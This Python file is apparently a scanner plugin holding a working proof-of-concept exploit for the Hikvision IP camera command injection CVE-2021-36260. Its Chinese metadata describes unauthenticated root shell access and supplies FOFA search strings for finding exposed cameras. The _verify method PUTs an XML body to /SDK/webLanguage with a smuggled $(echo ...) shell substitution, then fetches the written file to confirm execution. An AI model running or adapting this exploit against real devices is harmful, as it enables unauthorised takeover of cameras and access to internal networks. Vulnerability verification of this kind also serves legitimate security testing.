# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua, random_str
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "海康威视 IP Camera 远程命令执行漏洞（CVE-2021-36260）",  # 漏洞名称
        "VulnID": "CVE-2021-36260",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "",  # 漏洞应用名称
        "AppVersion": "",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            攻击者利用该漏洞可以用无限制的 root shell 来完全控制设备，即使设备的所有者受限于有限的受保护 shell（psh）。除了入侵 IP 摄像头外，还可以访问和攻击内部网络。
            该漏洞的利用并不需要用户交互，攻击者只需要访问 http 或 HTTPS 服务器端口（80/443）即可利用该漏洞，无需用户名、密码、以及其他操作。摄像头本身也不会检测到任何登录信息。
            [海康威视远程命令执行漏洞（CVE-2021-36260） | wolke](https://wolke.cn/post/8d6522ff.html)
        """,  # 漏洞简要描述

        "fofa-dork": """
            icon_hash="999357577"
            app="HIKVISION-视频监控" && icon_hash="999357577"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        url = self.target + "/SDK/webLanguage"  # url自己按需调整
        num_A = random_str(3, "int")
        num_B = random_str(3, "int")
        calc_flag = str(int(num_A) * int(num_B))
        path_flag = random_str(6, "str")
        data = "<?xml version='1.0' encoding='utf-8'?><language>$(echo $((%s*%s)) > webLib/%s)</language>" % (
            num_A, num_B, path_flag)

        headers = {
            "User-Agent": get_random_ua(),
            "Connection": "close",
            # "Content-Type": "application/x-www-form-urlencoded",
        }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.put(url, data=data, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
            req1 = requests.get(self.target + "/" + path_flag, headers=headers, proxies=self.proxy,
                                timeout=self.timeout, verify=False)
            if calc_flag in req1.text:  # req.status_code == 200 and :
                vuln = [True, req1.text]
            else:
                vuln = [False, req1.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
